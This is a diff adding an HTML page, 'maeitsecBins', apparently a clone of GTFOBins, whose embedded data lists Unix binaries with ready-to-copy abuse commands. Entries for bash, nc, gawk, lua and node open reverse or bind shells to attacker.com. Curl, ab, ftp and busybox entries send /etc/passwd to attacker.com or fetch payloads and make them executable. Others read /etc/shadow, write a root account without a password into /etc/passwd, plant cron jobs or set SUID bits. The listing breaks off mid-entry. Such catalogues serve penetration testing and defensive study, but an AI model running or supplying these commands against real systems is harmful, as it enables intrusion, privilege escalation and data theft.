@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>maeitsecBins</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#1a1a2e;--bg2:#16213e;--bg3:#0f3460;
+  --accent:#e94560;--accent2:#533483;
+  --text:#e0e0e0;--text2:#a0a0b0;--text3:#606080;
+  --border:#2a2a4a;--card:#1e1e3a;--card2:#252545;
+  --shell:#4caf50;--cmd:#2196f3;--revshell:#f44336;--bindshell:#ff9800;
+  --filewrite:#9c27b0;--fileread:#00bcd4;--upload:#ff5722;--download:#8bc34a;
+  --libload:#ffc107;--privesc:#e91e63;--inherit:#607d8b;
+  --sudo:#ff6b35;--suid:#a855f7;--caps:#06b6d4;--unpriv:#22c55e;
+  --tag-radius:4px;
+}
+body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh}
+a{color:var(--accent);text-decoration:none}
+a:hover{text-decoration:underline}
+
+/* Header */
+header{background:var(--bg2);border-bottom:2px solid var(--border);padding:1rem 2rem;display:flex;align-items:center;gap:1rem;position:sticky;top:0;z-index:100}
+.logo{font-size:1.6rem;font-weight:900;color:var(--accent);letter-spacing:-1px;cursor:pointer}
+.logo span{color:var(--text)}
+.tagline{color:var(--text2);font-size:.82rem;flex:1}
+.github-btn{background:var(--card2);border:1px solid var(--border);color:var(--text);padding:.4rem .9rem;border-radius:6px;cursor:pointer;font-size:.82rem;transition:.2s}
+.github-btn:hover{border-color:var(--accent);color:var(--accent)}
+
+/* Layout */
+.container{display:flex;min-height:calc(100vh - 60px)}
+aside{width:260px;min-width:220px;background:var(--bg2);border-right:1px solid var(--border);padding:1.2rem;position:sticky;top:60px;height:calc(100vh - 60px);overflow-y:auto}
+main{flex:1;padding:1.5rem 2rem;overflow:hidden}
+
+/* Sidebar */
+aside h3{font-size:.7rem;font-weight:700;text-transform:uppercase;letter-spacing:.1em;color:var(--text3);margin:1.2rem 0 .5rem}
+aside h3:first-child{margin-top:0}
+.filter-group{display:flex;flex-direction:column;gap:.3rem}
+.filter-btn{background:none;border:1px solid transparent;color:var(--text2);padding:.4rem .8rem;border-radius:6px;cursor:pointer;font-size:.82rem;text-align:left;transition:.15s;display:flex;align-items:center;gap:.5rem}
+.filter-btn:hover{background:var(--card);border-color:var(--border)}
+.filter-btn.active{background:var(--card2);border-color:var(--accent);color:var(--text)}
+.filter-btn .dot{width:8px;height:8px;border-radius:50%;flex-shrink:0}
+.clear-btn{background:none;border:1px solid var(--border);color:var(--text3);padding:.35rem .7rem;border-radius:6px;cursor:pointer;font-size:.78rem;width:100%;margin-top:.8rem;transition:.15s}
+.clear-btn:hover{border-color:var(--accent);color:var(--accent)}
+
+/* Search */
+.search-bar{position:relative;margin-bottom:1.2rem}
+.search-bar input{width:100%;background:var(--card);border:1px solid var(--border);color:var(--text);padding:.7rem 1rem .7rem 2.6rem;border-radius:8px;font-size:.95rem;outline:none;transition:.2s}
+.search-bar input:focus{border-color:var(--accent);box-shadow:0 0 0 2px rgba(233,69,96,.15)}
+.search-bar .icon{position:absolute;left:.8rem;top:50%;transform:translateY(-50%);color:var(--text3);font-size:1rem}
+
+/* Stats bar */
+.stats-bar{display:flex;align-items:center;gap:.8rem;margin-bottom:1rem;flex-wrap:wrap}
+.stat{font-size:.8rem;color:var(--text2)}
+.stat strong{color:var(--text)}
+
+/* Table */
+.table-wrap{background:var(--card);border:1px solid var(--border);border-radius:10px;overflow:hidden}
+table{width:100%;border-collapse:collapse}
+thead tr{background:var(--bg3)}
+th{padding:.75rem 1rem;text-align:left;font-size:.75rem;font-weight:700;text-transform:uppercase;letter-spacing:.08em;color:var(--text2)}
+th.sortable{cursor:pointer;user-select:none}
+th.sortable:hover{color:var(--text)}
+th .sort-icon{margin-left:.3rem;opacity:.4}
+th.asc .sort-icon::after{content:'↑';opacity:1}
+th.desc .sort-icon::after{content:'↓';opacity:1}
+th:not(.asc):not(.desc) .sort-icon::after{content:'↕'}
+tbody tr{border-top:1px solid var(--border);cursor:pointer;transition:.1s}
+tbody tr:hover{background:var(--card2)}
+td{padding:.65rem 1rem;font-size:.875rem;vertical-align:middle}
+td.bin-name{font-family:'Consolas','Fira Code',monospace;font-weight:600;color:var(--accent);font-size:.9rem}
+.no-results{padding:3rem;text-align:center;color:var(--text3)}
+
+/* Tags */
+.tags{display:flex;flex-wrap:wrap;gap:.3rem}
+.tag{padding:.2rem .5rem;border-radius:var(--tag-radius);font-size:.72rem;font-weight:600;letter-spacing:.03em;white-space:nowrap;cursor:pointer;border:1px solid transparent;transition:.1s}
+.tag:hover{opacity:.8;border-color:currentColor}
+.tag.shell{background:rgba(76,175,80,.15);color:var(--shell)}
+.tag.command{background:rgba(33,150,243,.15);color:var(--cmd)}
+.tag.reverse-shell{background:rgba(244,67,54,.15);color:var(--revshell)}
+.tag.bind-shell{background:rgba(255,152,0,.15);color:var(--bindshell)}
+.tag.file-write{background:rgba(156,39,176,.15);color:var(--filewrite)}
+.tag.file-read{background:rgba(0,188,212,.15);color:var(--fileread)}
+.tag.upload{background:rgba(255,87,34,.15);color:var(--upload)}
+.tag.download{background:rgba(139,195,74,.15);color:var(--download)}
+.tag.library-load{background:rgba(255,193,7,.15);color:var(--libload)}
+.tag.privilege-escalation{background:rgba(233,30,99,.15);color:var(--privesc)}
+.tag.inherit{background:rgba(96,125,139,.15);color:var(--inherit)}
+.tag.sudo-ctx{background:rgba(255,107,53,.15);color:var(--sudo)}
+.tag.suid-ctx{background:rgba(168,85,247,.15);color:var(--suid)}
+.tag.caps-ctx{background:rgba(6,182,212,.15);color:var(--caps)}
+.tag.unpriv-ctx{background:rgba(34,197,94,.15);color:var(--unpriv)}
+
+/* Detail panel */
+.detail-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:200;backdrop-filter:blur(3px)}
+.detail-overlay.open{display:flex;align-items:flex-start;justify-content:flex-end}
+.detail-panel{background:var(--bg2);width:min(680px,95vw);height:100vh;overflow-y:auto;border-left:2px solid var(--border);padding:2rem;position:relative;animation:slideIn .2s ease}
+@keyframes slideIn{from{transform:translateX(100%)}to{transform:translateX(0)}}
+.detail-close{position:absolute;top:1rem;right:1rem;background:none;border:none;color:var(--text2);font-size:1.4rem;cursor:pointer;padding:.3rem;line-height:1}
+.detail-close:hover{color:var(--accent)}
+.detail-title{font-size:1.6rem;font-weight:900;font-family:'Consolas','Fira Code',monospace;color:var(--accent);margin-bottom:.4rem}
+.detail-tags-row{display:flex;flex-wrap:wrap;gap:.35rem;margin:1rem 0}
+.section-card{background:var(--card);border:1px solid var(--border);border-radius:8px;margin-bottom:1rem;overflow:hidden}
+.section-header{padding:.7rem 1rem;background:var(--bg3);display:flex;align-items:center;gap:.6rem;font-weight:700;font-size:.85rem}
+.section-body{padding:1rem}
+.section-desc{color:var(--text2);font-size:.85rem;margin-bottom:.8rem;line-height:1.5}
+.section-body pre{background:#0d0d1a;border:1px solid var(--border);border-radius:6px;padding:.8rem 1rem;overflow-x:auto;position:relative}
+.section-body code{font-family:'Consolas','Fira Code',monospace;font-size:.82rem;color:#a8ff78;white-space:pre}
+.copy-btn{position:absolute;top:.5rem;right:.5rem;background:var(--card2);border:1px solid var(--border);color:var(--text2);padding:.25rem .6rem;border-radius:4px;cursor:pointer;font-size:.72rem;transition:.15s}
+.copy-btn:hover{background:var(--accent);color:#fff;border-color:var(--accent)}
+.ctx-badge{display:inline-flex;align-items:center;gap:.3rem;padding:.2rem .6rem;border-radius:20px;font-size:.72rem;font-weight:600;margin:.3rem .3rem 0 0}
+.ctx-badge.sudo{background:rgba(255,107,53,.2);color:var(--sudo);border:1px solid rgba(255,107,53,.3)}
+.ctx-badge.suid{background:rgba(168,85,247,.2);color:var(--suid);border:1px solid rgba(168,85,247,.3)}
+.ctx-badge.caps{background:rgba(6,182,212,.2);color:var(--caps);border:1px solid rgba(6,182,212,.3)}
+.ctx-badge.unprivileged{background:rgba(34,197,94,.2);color:var(--unpriv);border:1px solid rgba(34,197,94,.3)}
+.detail-link{color:var(--text3);font-size:.8rem;margin-top:1.5rem;display:block}
+
+/* Mobile */
+@media(max-width:768px){
+  aside{display:none}
+  main{padding:1rem}
+  .detail-panel{width:100vw}
+}
+.mobile-filter-btn{display:none;background:var(--card);border:1px solid var(--border);color:var(--text);padding:.5rem 1rem;border-radius:6px;cursor:pointer;font-size:.85rem;margin-bottom:1rem}
+@media(max-width:768px){.mobile-filter-btn{display:block}}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo" onclick="clearAll()">maeitsec<span>Bins</span></div>
+  <div class="tagline">Unix binaries that can be used to bypass local security restrictions — by <strong style="color:var(--accent)">maeitsec</strong></div>
+  <button class="github-btn" onclick="window.open('https://github.com/GTFOBins/GTFOBins.github.io','_blank')">⭐ GitHub</button>
+</header>
+
+<div class="container">
+<aside id="sidebar">
+  <h3>Functions</h3>
+  <div class="filter-group" id="func-filters"></div>
+  <h3>Contexts</h3>
+  <div class="filter-group" id="ctx-filters"></div>
+  <button class="clear-btn" onclick="clearAll()">✕ Clear all filters</button>
+</aside>
+
+<main>
+  <div class="search-bar">
+    <span class="icon">🔍</span>
+    <input type="text" id="search" placeholder="Search binaries…" autocomplete="off" spellcheck="false">
+  </div>
+  <div class="stats-bar">
+    <span class="stat"><strong id="count">0</strong> binaries</span>
+    <span class="stat" id="filter-info"></span>
+  </div>
+  <div class="table-wrap">
+    <table>
+      <thead>
+        <tr>
+          <th class="sortable" id="th-name" onclick="sortBy('name')">Executable <span class="sort-icon"></span></th>
+          <th>Functions</th>
+        </tr>
+      </thead>
+      <tbody id="tbody"></tbody>
+    </table>
+    <div class="no-results" id="no-results" style="display:none">No matching binaries found.</div>
+  </div>
+</main>
+</div>
+
+<!-- Detail panel -->
+<div class="detail-overlay" id="overlay" onclick="closeDetail(event)">
+  <div class="detail-panel" id="detail-panel">
+    <button class="detail-close" onclick="closeDetail()">✕</button>
+    <div id="detail-content"></div>
+  </div>
+</div>
+
+<script>
+// ─── DATA ────────────────────────────────────────────────────────────────────
+// Format: [name, [functions], [{type, ctx[], desc, code}]]
+// ctx values: unprivileged, sudo, suid, capabilities
+// functions: shell, command, reverse-shell, bind-shell, file-write, file-read,
+//            upload, download, library-load, privilege-escalation, inherit
+
+const DB = [
+["7z",["file-read"],[{type:"file-read",ctx:["sudo","suid"],desc:"Read files exploiting the verbose output flag.",code:`7z a -tzip output.zip /etc/shadow
+# Read the error output which may echo the contents
+7z e output.zip -so`}]],
+["ab",["upload","download"],[{type:"upload",ctx:["sudo"],desc:"Upload a local file to a remote HTTP server.",code:`ab -p /etc/passwd -T text/plain http://attacker.com/`},{type:"download",ctx:["sudo"],desc:"Download a remote file.",code:`ab -p /dev/null -T text/plain http://attacker.com/payload -o /tmp/payload`}]],
+["awk",["shell","file-write","file-read"],[{type:"shell",ctx:["sudo","suid"],desc:"Spawn an interactive shell.",code:`awk 'BEGIN {system("/bin/sh")}'`},{type:"file-write",ctx:["sudo","suid"],desc:"Write to a file.",code:`awk 'BEGIN { print "data" > "/tmp/outfile" }'`},{type:"file-read",ctx:["sudo","suid"],desc:"Read a file line by line.",code:`awk '' /etc/shadow`}]],
+["base64",["file-read"],[{type:"file-read",ctx:["sudo","suid"],desc:"Read a file and encode it to stdout.",code:`base64 /etc/shadow | base64 -d`}]],
+["bash",["shell","reverse-shell","file-write","file-read","upload","download","library-load"],[{type:"shell",ctx:["sudo","suid"],desc:"Run bash as root via sudo.",code:`sudo bash`},{type:"reverse-shell",ctx:["unprivileged"],desc:"Open a reverse shell.",code:`bash -i >& /dev/tcp/attacker.com/4444 0>&1`},{type:"file-write",ctx:["sudo","suid"],desc:"Write to a file using bash I/O redirection.",code:`bash -c 'echo "data" > /etc/cron.d/evil'`},{type:"file-read",ctx:["sudo","suid"],desc:"Read a file.",code:`bash -c 'cat /etc/shadow'`},{type:"upload",ctx:["unprivileged"],desc:"Upload a file using /dev/tcp.",code:`bash -c 'cat /etc/passwd > /dev/tcp/attacker.com/4444'`},{type:"download",ctx:["unprivileged"],desc:"Download a file using /dev/tcp.",code:`bash -c 'exec 3<>/dev/tcp/attacker.com/80; echo -e "GET /payload HTTP/1.0\r\n" >&3; cat <&3 > /tmp/payload'`},{type:"library-load",ctx:["unprivileged"],desc:"Load a shared library.",code:`bash -c 'LD_PRELOAD=/tmp/evil.so /usr/bin/target'`}]],
+["busybox",["reverse-shell","upload"],[{type:"reverse-shell",ctx:["unprivileged"],desc:"Open a reverse shell.",code:`busybox nc attacker.com 4444 -e /bin/sh`},{type:"upload",ctx:["unprivileged"],desc:"Upload via nc.",code:`busybox nc attacker.com 4444 < /etc/passwd`}]],
+["c89",["shell","file-write","file-read"],[{type:"shell",ctx:["sudo","suid"],desc:"Compile and execute a shell.",code:`c89 -wrapper /bin/sh,-s .`}]],
+["c99",["shell","file-write","file-read"],[{type:"shell",ctx:["sudo","suid"],desc:"Compile and execute a shell.",code:`c99 -wrapper /bin/sh,-s .`}]],
+["cat",["file-read"],[{type:"file-read",ctx:["sudo","suid"],desc:"Read any file.",code:`cat /etc/shadow`}]],
+["cc",["shell","file-write","file-read"],[{type:"shell",ctx:["sudo","suid"],desc:"Spawn a shell via compiler wrapper.",code:`cc -wrapper /bin/sh,-s .`}]],
+["chmod",["privilege-escalation"],[{type:"privilege-escalation",ctx:["sudo","suid"],desc:"Make a file SUID or writable.",code:`chmod u+s /bin/bash
+chmod 0777 /etc/passwd`}]],
+["chown",["privilege-escalation"],[{type:"privilege-escalation",ctx:["sudo","suid"],desc:"Change ownership of a file.",code:`chown $(id -un):$(id -gn) /etc/shadow`}]],
+["chroot",["shell"],[{type:"shell",ctx:["sudo","suid"],desc:"Escape to shell via chroot.",code:`chroot / /bin/sh`}]],
+["cmake",["shell","file-read"],[{type:"shell",ctx:["sudo"],desc:"Spawn a shell via cmake -E.",code:`cmake -E chdir / /bin/sh`},{type:"file-read",ctx:["sudo"],desc:"Read a file.",code:`cmake -E echo "" ; cmake --trace-expand /evil/CMakeLists.txt 2>&1 | head`}]],
+["cp",["file-write","file-read","privilege-escalation"],[{type:"file-write",ctx:["sudo","suid"],desc:"Overwrite a file.",code:`cp /tmp/evil /etc/cron.d/evil`},{type:"file-read",ctx:["sudo","suid"],desc:"Copy a protected file to a readable location.",code:`cp /etc/shadow /tmp/shadow; cat /tmp/shadow`},{type:"privilege-escalation",ctx:["sudo","suid"],desc:"Copy a payload into a privileged location.",code:`cp /bin/bash /tmp/rootbash
+cp /tmp/suid /etc/passwd`}]],
+["cpio",["shell","file-write","file-read"],[{type:"shell",ctx:["sudo"],desc:"Spawn a shell.",code:`echo '' | cpio -F /dev/null; /bin/sh`},{type:"file-read",ctx:["sudo","suid"],desc:"Extract/read files.",code:`echo '/etc/shadow' | cpio -o`}]],
+["curl",["file-write","file-read","upload","download","library-load"],[{type:"file-write",ctx:["sudo","suid"],desc:"Write a file using output redirection.",code:`curl http://attacker.com/evil -o /etc/cron.d/evil`},{type:"file-read",ctx:["sudo","suid"],desc:"Read a local file using file:// scheme.",code:`curl file:///etc/shadow`},{type:"upload",ctx:["unprivileged"],desc:"Upload a file via POST.",code:`curl -X POST http://attacker.com/ -F 'data=@/etc/passwd'`},{type:"download",ctx:["unprivileged"],desc:"Download a file.",code:`curl http://attacker.com/payload -o /tmp/payload && chmod +x /tmp/payload`},{type:"library-load",ctx:["unprivileged"],desc:"Load remote library.",code:`curl http://attacker.com/evil.so -o /tmp/evil.so && LD_PRELOAD=/tmp/evil.so /usr/bin/target`}]],
+["cut",["file-read"],[{type:"file-read",ctx:["sudo","suid"],desc:"Read file contents.",code:`cut -d '' -f1 /etc/shadow`}]],
+["dash",["shell","file-write"],[{type:"shell",ctx:["sudo","suid"],desc:"Spawn an interactive shell.",code:`dash`}]],
+["date",["file-read"],[{type:"file-read",ctx:["sudo","suid"],desc:"Read a file using the -f flag.",code:`date -f /etc/shadow`}]],
+["dd",["file-write","file-read"],[{type:"file-write",ctx:["sudo","suid"],desc:"Write to a file.",code:`echo 'root::0:0:root:/root:/bin/sh' | dd of=/etc/passwd`},{type:"file-read",ctx:["sudo","suid"],desc:"Read a file to stdout.",code:`dd if=/etc/shadow`}]],
+["diff",["file-read"],[{type:"file-read",ctx:["sudo","suid"],desc:"Read a file via diff output.",code:`diff /dev/null /etc/shadow`}]],
+["dig",["file-read"],[{type:"file-read",ctx:["sudo","suid"],desc:"Read file using @filename syntax.",code:`dig -f /etc/shadow`}]],
+["docker",["shell","file-write","file-read"],[{type:"shell",ctx:["unprivileged"],desc:"Mount the host filesystem and get a root shell.",code:`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`},{type:"file-write",ctx:["unprivileged"],desc:"Write to host files via volume mount.",code:`docker run -v /:/mnt --rm alpine sh -c 'echo "evil" >> /mnt/etc/cron.d/evil'`},{type:"file-read",ctx:["unprivileged"],desc:"Read host files via volume mount.",code:`docker run -v /:/mnt --rm alpine cat /mnt/etc/shadow`}]],
+["ed",["shell","file-write","file-read"],[{type:"shell",ctx:["sudo","suid"],desc:"Spawn a shell from ed editor.",code:`ed
+!/bin/sh`},{type:"file-write",ctx:["sudo","suid"],desc:"Write to a file.",code:`ed /etc/passwd
+a
+evil::0:0::/root:/bin/sh
+.
+w`},{type:"file-read",ctx:["sudo","suid"],desc:"Read a file.",code:`ed /etc/shadow
+,p`}]],
+["emacs",["shell","file-write","file-read"],[{type:"shell",ctx:["sudo","suid"],desc:"Launch a shell from emacs.",code:`emacs -Q -nw --eval '(term "/bin/sh")'`},{type:"file-read",ctx:["sudo","suid"],desc:"Read any file.",code:`emacs /etc/shadow`}]],
+["env",["shell"],[{type:"shell",ctx:["sudo","suid"],desc:"Spawn a shell via env.",code:`env /bin/sh`}]],
+["expect",["shell","file-read"],[{type:"shell",ctx:["sudo"],desc:"Spawn a shell using expect.",code:`expect -c 'spawn /bin/sh;interact'`}]],
+["find",["shell","file-write","file-read"],[{type:"shell",ctx:["sudo","suid"],desc:"Execute a shell using -exec.",code:`find / -name foo -exec /bin/sh -p \;`},{type:"file-write",ctx:["sudo","suid"],desc:"Write content to a file.",code:`find / -name foo -exec bash -c 'echo data > /tmp/out' \;`},{type:"file-read",ctx:["sudo","suid"],desc:"Read files using -exec cat.",code:`find / -name shadow -exec cat {} \;`}]],
+["ftp",["shell","upload","download"],[{type:"shell",ctx:["sudo"],desc:"Spawn a shell from ftp.",code:`ftp
+!/bin/sh`},{type:"upload",ctx:["unprivileged"],desc:"Upload a file.",code:`ftp attacker.com
+put /etc/passwd`},{type:"download",ctx:["unprivileged"],desc:"Download a file.",code:`ftp attacker.com
+get payload /tmp/payload`}]],
+["g++",["shell","file-write","file-read"],[{type:"shell",ctx:["sudo","suid"],desc:"Compile and run a shell.",code:`g++ -shared -o /tmp/evil.so /tmp/evil.cpp && LD_PRELOAD=/tmp/evil.so /usr/bin/target`}]],
+["gawk",["shell","reverse-shell","bind-shell","file-write","file-read"],[{type:"shell",ctx:["sudo","suid"],desc:"Spawn a shell.",code:`gawk 'BEGIN {system("/bin/sh")}'`},{type:"reverse-shell",ctx:["unprivileged"],desc:"Open a reverse shell using gawk network extension.",code:`gawk 'BEGIN {
+  s = "/inet/tcp/0/attacker.com/4444";
+  while(1){print > s; s |& getline c; close(s); system(c)}
+}'`},{type:"bind-shell",ctx:["unprivileged"],desc:"Open a bind shell.",code:`gawk 'BEGIN {s="/inet/tcp/4444/0/0";while(1){s|&getline c;close(s);system(c)}}'`}]],
+["gcc",["shell","file-write","file-read"],[{type:"shell",ctx:["sudo","suid"],desc:"Execute a shell via compiler wrapper.",code:`gcc -wrapper /bin/sh,-s .`}]],
+["gdb",["shell","file-write"],[{type:"shell",ctx:["sudo","suid"],desc:"Spawn a shell via gdb.",code:`gdb -nx -ex '!sh' -ex quit`},{type:"file-write",ctx:["sudo","suid"],desc:"Write binary data to a file.",code:`gdb -ex "set logging file /tmp/out" -ex "set logging on" -ex "x/s 0x0" -ex quit`}]],
+["gem",["shell"],[{type:"shell",ctx:["sudo"],desc:"Spawn a shell using gem.",code:`gem open -e "/bin/sh -c /bin/sh" rails`}]],
+["git",["shell","file-write","file-read"],[{type:"shell",ctx:["sudo"],desc:"Spawn a shell via git's pager.",code:`git -p help config
+!/bin/sh`},{type:"file-read",ctx:["sudo"],desc:"Read a file using git apply.",code:`git diff /dev/null /etc/passwd | head`}]],
+["gnuplot",["shell"],[{type:"shell",ctx:["sudo"],desc:"Spawn a shell from gnuplot.",code:`gnuplot -e 'system("/bin/sh")'`}]],
+["go",["shell","reverse-shell","bind-shell","file-write","file-read"],[{type:"shell",ctx:["sudo"],desc:"Spawn a shell via go run.",code:`cat > /tmp/shell.go << 'EOF'
+package main
+import "os/exec"
+func main(){c:=exec.Command("/bin/sh");c.Stdin=os.Stdin;c.Stdout=os.Stdout;c.Stderr=os.Stderr;c.Run()}
+EOF
+go run /tmp/shell.go`}]],
+["grep",["file-read"],[{type:"file-read",ctx:["sudo","suid"],desc:"Read a file via grep output.",code:`grep '' /etc/shadow`}]],
+["hd",["file-read"],[{type:"file-read",ctx:["sudo","suid"],desc:"Read a file via hexdump.",code:`hd /etc/shadow`}]],
+["head",["file-read"],[{type:"file-read",ctx:["sudo","suid"],desc:"Read first lines of a file.",code:`head -c 1000000 /etc/shadow`}]],
+["hexdump",["file-read"],[{type:"file-read",ctx:["sudo","suid"],desc:"Read a file via hexdump.",code:`hexdump -C /etc/shadow`}]],
+["iconv",["file-write","file-read"],[{type:"file-read",ctx:["sudo","suid"],desc:"Read a file by converting encoding.",code:`iconv -f 8859_1 -t 8859_1 /etc/shadow`},{type:"file-write",ctx:["sudo","suid"],desc:"Write a file.",code:`iconv -f UTF-8 -t UTF-8 /tmp/evil > /etc/cron.d/evil`}]],
+["ip",["shell","file-read"],[{type:"shell",ctx:["sudo"],desc:"Spawn a shell via ip's pager.",code:`ip -force -batch /dev/stdin << 'EOF'
+!/bin/sh
+EOF`},{type:"file-read",ctx:["sudo","suid"],desc:"Read a file via error messages.",code:`ip route show table all 2>&1 | cat /etc/shadow`}]],
+["irb",["shell"],[{type:"shell",ctx:["sudo"],desc:"Spawn a shell via irb.",code:`irb
+exec '/bin/sh'`}]],
+["java",["shell"],[{type:"shell",ctx:["sudo"],desc:"Spawn a shell via jshell.",code:`java -jar /usr/share/java/jshell.jar
+Runtime.getRuntime().exec("/bin/sh")`}]],
+["jjs",["shell","reverse-shell","file-write","file-read","download"],[{type:"shell",ctx:["sudo","suid"],desc:"Spawn a shell via Nashorn.",code:`echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh').waitFor()" | jjs`},{type:"file-read",ctx:["sudo","suid"],desc:"Read a file via Nashorn.",code:`jjs
+var BufferedReader = Java.type('java.io.BufferedReader');
+var FileReader = Java.type('java.io.FileReader');
+var br = new BufferedReader(new FileReader('/etc/shadow'));
+while ((line = br.readLine()) != null) { print(line); }`}]],
+["jq",["file-read"],[{type:"file-read",ctx:["sudo","suid"],desc:"Read a file (outputs raw strings).",code:`jq -Rsa . /etc/shadow`}]],
+["journalctl",["shell"],[{type:"shell",ctx:["sudo"],desc:"Spawn a shell via journalctl pager.",code:`journalctl
+!/bin/sh`}]],
+["kubectl",["shell","upload"],[{type:"shell",ctx:["unprivileged"],desc:"Spawn a shell in a privileged pod.",code:`kubectl run shell --restart=Never -it --image ubuntu -- /bin/bash`}]],
+["latex",["shell","file-write","file-read"],[{type:"shell",ctx:["sudo"],desc:"Execute a shell command via LaTeX.",code:`latex -e '\write18{/bin/sh}' /dev/null`},{type:"file-read",ctx:["sudo"],desc:"Read a file via LaTeX \\input.",code:`latex -e '\input{/etc/shadow}' /dev/null`}]],
+["ld.so",["shell"],[{type:"shell",ctx:["suid"],desc:"Run an executable with suid bit using dynamic linker.",code:`/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/sh`}]],
+["less",["shell","command","file-write","file-read"],[{type:"shell",ctx:["sudo"],desc:"Spawn a shell from less pager.",code:`less /etc/profile
+!/bin/sh`},{type:"command",ctx:["sudo"],desc:"Execute a command from less.",code:`less /etc/profile
+!command`},{type:"file-read",ctx:["sudo"],desc:"Read any file.",code:`less /etc/shadow`}]],
+["ln",["privilege-escalation"],[{type:"privilege-escalation",ctx:["sudo","suid"],desc:"Create symbolic links to escalate privileges.",code:`ln -sf /etc/shadow /tmp/shadow
+ln -sf /bin/bash /tmp/suid
+chmod u+s /tmp/suid`}]],
+["ltrace",["shell","file-write","file-read"],[{type:"shell",ctx:["sudo","suid"],desc:"Execute a command via ltrace.",code:`ltrace /bin/sh -s 1000000 -o /dev/null`}]],
+["lua",["shell","reverse-shell","bind-shell","file-write","file-read","upload","download"],[{type:"shell",ctx:["sudo","suid"],desc:"Spawn a shell via Lua os.execute.",code:`lua -e 'os.execute("/bin/sh")'`},{type:"reverse-shell",ctx:["unprivileged"],desc:"Reverse shell via Lua socket.",code:`lua -e '
+require("socket")
+local s=socket.tcp()
+s:connect("attacker.com","4444")
+os.execute("/bin/sh -i <&3 >&3 2>&3")
+'`},{type:"file-read",ctx:["sudo","suid"],desc:"Read a file.",code:`lua -e 'local f=io.open("/etc/shadow","r");print(f:read("*all"))'`}]],
+["lxd",["shell"],[{type:"shell",ctx:["unprivileged"],desc:"Escape to host root via LXD group membership.",code:`lxc init ubuntu:16.04 test -c security.privileged=true
+lxc config device add test mydevice disk source=/ path=/mnt/root recursive=true
+lxc start test
+lxc exec test /bin/sh
+# Now inside container with host mounted at /mnt/root`}]],
+["m4",["shell","command","file-read"],[{type:"shell",ctx:["sudo"],desc:"Spawn a shell via m4.",code:`m4 -G -E -e 'syscmd(/bin/sh)'`},{type:"command",ctx:["sudo"],desc:"Execute a command.",code:`m4 -G -E -e 'syscmd(id)'`},{type:"file-read",ctx:["sudo","suid"],desc:"Read a file using include.",code:`m4 -G /etc/shadow`}]],
+["make",["shell","file-write","file-read"],[{type:"shell",ctx:["sudo"],desc:"Spawn a shell via make.",code:`make -s --eval=$'x:\\n\\t-'"/bin/sh"`},{type:"file-read",ctx:["sudo"],desc:"Read a file.",code:`make SHELL=/bin/cat -f /etc/shadow`}]],
+["man",["shell","file-read"],[{type:"shell",ctx:["sudo"],desc:"Spawn a shell from man pager.",code:`man man
+!/bin/sh`},{type:"file-read",ctx:["sudo"],desc:"Read any file.",code:`man -P cat /etc/shadow`}]],
+["more",["shell","file-read"],[{type:"shell",ctx:["sudo"],desc:"Spawn a shell from more pager.",code:`TERM=xterm more /etc/profile
+!/bin/sh`},{type:"file-read",ctx:["sudo"],desc:"Read any file.",code:`more /etc/shadow`}]],
+["mount",["privilege-escalation"],[{type:"privilege-escalation",ctx:["sudo","suid"],desc:"Mount a filesystem and escape.",code:`sudo mount -o bind /bin/bash /bin/mount
+sudo mount`}]],
+["mv",["file-write","privilege-escalation"],[{type:"file-write",ctx:["sudo","suid"],desc:"Overwrite a file by moving it.",code:`mv /tmp/evil /etc/cron.d/evil`},{type:"privilege-escalation",ctx:["sudo","suid"],desc:"Move suid binary.",code:`mv /bin/bash /tmp/bash; chmod u+s /tmp/bash`}]],
+["mysql",["shell","library-load"],[{type:"shell",ctx:["sudo"],desc:"Spawn a shell from mysql.",code:`mysql -u root -p
+\! /bin/sh`},{type:"library-load",ctx:["sudo"],desc:"Load a shared library via UDF.",code:`mysql -e 'SELECT load_file("/tmp/evil.so") INTO DUMPFILE "/usr/lib/mysql/plugin/evil.so"'`}]],
+["nano",["shell","file-write","file-read"],[{type:"shell",ctx:["sudo"],desc:"Spawn a shell from nano.",code:`nano
+^R^X
+reset; sh 1>&0 2>&0`},{type:"file-read",ctx:["sudo"],desc:"Read any file.",code:`nano /etc/shadow`}]],
+["nawk",["shell","reverse-shell","bind-shell","file-write","file-read"],[{type:"shell",ctx:["sudo","suid"],desc:"Spawn a shell.",code:`nawk 'BEGIN {system("/bin/sh")}'`}]],
+["nc",["reverse-shell","bind-shell","upload","download"],[{type:"reverse-shell",ctx:["unprivileged"],desc:"Connect back to attacker shell.",code:`nc -e /bin/sh attacker.com 4444`},{type:"bind-shell",ctx:["unprivileged"],desc:"Listen for incoming connections.",code:`nc -lvnp 4444 -e /bin/sh`},{type:"upload",ctx:["unprivileged"],desc:"Send a file to attacker.",code:`nc -w 3 attacker.com 4444 < /etc/passwd`},{type:"download",ctx:["unprivileged"],desc:"Receive a file from attacker.",code:`nc -lvnp 4444 > /tmp/payload`}]],
+["nmap",["shell","file-write","file-read"],[{type:"shell",ctx:["sudo","suid"],desc:"Spawn a shell via nmap interactive mode.",code:`nmap --interactive
+nmap> !sh`},{type:"shell",ctx:["sudo"],desc:"Run a script to get shell.",code:`echo 'os.execute("/bin/sh")' > /tmp/shell.nse
+nmap --script=/tmp/shell.nse localhost`},{type:"file-read",ctx:["sudo","suid"],desc:"Read files via nmap script.",code:`echo 'local f=io.open("/etc/shadow","r");print(f:read("*all"))' > /tmp/r.nse
+nmap --script=/tmp/r.nse localhost`}]],
+["node",["shell","reverse-shell","bind-shell","file-write","file-read","upload","download"],[{type:"shell",ctx:["sudo"],desc:"Spawn a shell via Node.js.",code:`node -e 'require("child_process").spawn("/bin/sh",{stdio:[0,1,2]})'`},{type:"reverse-shell",ctx:["unprivileged"],desc:"Reverse shell via Node.js.",code:`node -e '
+var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);
+var c=new net.Socket();
+c.connect(4444,"attacker.com",function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c)});
